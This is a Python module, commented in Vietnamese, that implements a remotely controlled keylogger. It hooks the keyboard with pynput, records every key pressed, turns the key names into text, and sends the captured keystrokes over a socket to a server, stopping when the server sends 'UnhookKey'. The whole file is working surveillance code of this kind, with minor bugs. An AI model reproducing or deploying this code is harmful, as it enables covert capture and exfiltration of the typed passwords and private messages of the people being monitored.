from threading import Thread
from pynput.keyboard import Key, Listener, Controller
from tkinter import *


def Keystroke(Client):
    Keyboards = Controller()    # Khởi tạo bộ đầu đọc bàn phím
    Stop = True
    ListKeys = []            # Khởi tạo list chứa các phím đã nhấn
    def StopHook():
        nonlocal Stop    # Khởi tạo biến Stop
        while True:       # Vòng lặp để đọc phím
            if Stop == True:
                try:
                    while True:                       
                        checkdata = Client.recv(1024).decode("utf-8")   # Nhận thông điệp từ server
                        if checkdata == "UnhookKey":                    # Nếu server yêu cầu ngắt đọc phím
                            print(Stop)                                 # In ra thông điệp
                            Stop = False                            # Đặt biến Stop = False
                            break
                finally:
                    Keyboards.release(Key.space)                    # Giải phóng phím space
            break

    def KeyLogger():
        while True:
            def Pressing(logger): #Nhận phím
                nonlocal ListKeys
                ListKeys.append(logger)
            def Releasing(logger):
                print(Stop)# Điều kiện ngừng vòng lặp
                if Stop == False: listener.stop()
            with Listener(on_release = Releasing, on_press = Pressing) as listener:
                listener.join()
            def Writing(ListKeys):
                global count    # Khởi tạo biến count
                logging = ''    # Khởi tạo chuỗi logging
                count = 0
                for logger in ListKeys:
                    temp = str(logger).replace("'","")  # Xóa ký tự '
                    
                    if(str(temp) == "Key.space"): temp = " "    # Đổi ký tự space thành ký tự trắng
                    elif(str(temp) == "Key.backspace"): temp = "Backspace"  # Đổi ký tự Backspace thành ký tự Backspace
                    elif(str(temp) == "Key.shift"): temp = ""   # Đổi ký tự shift thành ký tự trắng

                    temp = str(temp).replace("Key.",'')         # Xóa ký tự Key.
                    temp = str(temp).replace("Key.cmd","")      # Xóa ký tự Key.cmd

                    if(str(temp) == "<96>"): temp = "0"  # Đổi ký tự <96> thành ký tự 0
                    elif(str(temp) == "<97>"): temp = "1"   # Đổi ký tự <97> thành ký tự 1
                    elif(str(temp) == "<98>"): temp = "2"   # ...
                    elif(str(temp) == "<99>"): temp = "3"
                    elif(str(temp) == "<100>"): temp = "4"
                    elif(str(temp) == "<101"): temp = "5"
                    elif(str(temp) == "<102>"): temp = "6"
                    elif(str(temp) == "<103>"): temp = "7"
                    elif(str(temp) == "<104>"): temp = "8"
                    elif(str(temp) == "<105>"): temp = "9"

                    temp = str(temp).replace("<home>","Home")   # Đổi ký tự <home> thành ký tự Home
                    temp = str(temp).replace("<esc>","ESC")     # Đổi ký tự <esc> thành ký tự ESC
                    temp = str(temp).replace("<tab>","")        #...
                    temp = str(temp).replace("<cmd>","fn")
                    temp = str(temp).replace("<enter>","Enter")
                    temp = str(temp).replace("<caps_lock>","")
                    temp = str(temp).replace("<shift_l>","")
                    temp = str(temp).replace("<shift_r>","")
                    temp = str(temp).replace("<ctrl_l>","")
                    temp = str(temp).replace("<num_lock>","")
                    temp = str(temp).replace("<ctrl_r>","")
                    temp = str(temp).replace("<alt_l>","")
                    temp = str(temp).replace("<alt_gr>","")
                    temp = str(temp).replace("<delete>","Del")
                    temp = str(temp).replace("<print_screen>","PrtSc")

                    temp = str(temp).replace("home","Home")     # Đổi ký tự home thành ký tự Home
                    temp = str(temp).replace("esc","ESC")       # Đổi ký tự esc thành ký tự ESC
                    temp = str(temp).replace("tab","")          # ...
                    temp = str(temp).replace("cmd","fn")
                    temp = str(temp).replace("enter","Enter")
                    temp = str(temp).replace("caps_lock","")
                    temp = str(temp).replace("shift_l","")
                    temp = str(temp).replace("shift_r","")
                    temp = str(temp).replace("ctrl_l","")
                    temp = str(temp).replace("num_lock","")
                    temp = str(temp).replace("ctrl_r","")
                    temp = str(temp).replace("alt_l","")
                    temp = str(temp).replace("alt_gr","")
                    temp = str(temp).replace("delete","Del")
                    temp = str(temp).replace("print_screen","PrtSc")
                    
                    logging += temp                       # Thêm ký tự vào chuỗi logging
                    count+=1                              # Tăng biến count lên 1
                    print(logging)                      # In ra chuỗi logging
                return logging[0:]                      # Trả về chuỗi logging
            data = Writing(ListKeys)
            if data == "": data = " "
            print(data)                                     # In ra chuỗi data
            Client.sendall(bytes(data,"utf-8"))             # Gửi chuỗi data đến server
            checkdata = Client.recv(1024).decode("utf-8")   # Nhận chuỗi data từ server
            ListKeys.clear()                                # Xóa danh sách ListKeys
            break
    threadingLogger = Thread(target = KeyLogger)            # Khởi tạo luồng KeyLogger
    threadingStop = Thread(target = StopHook)               # Khởi tạo threadingStop
    threadingStop.start()                                   # Khởi tạo threadingStop
    threadingLogger.start()                                 # Khởi tạo và chạy threadingLogger
    threadingLogger.join()                                  # Chạy threadingLogger
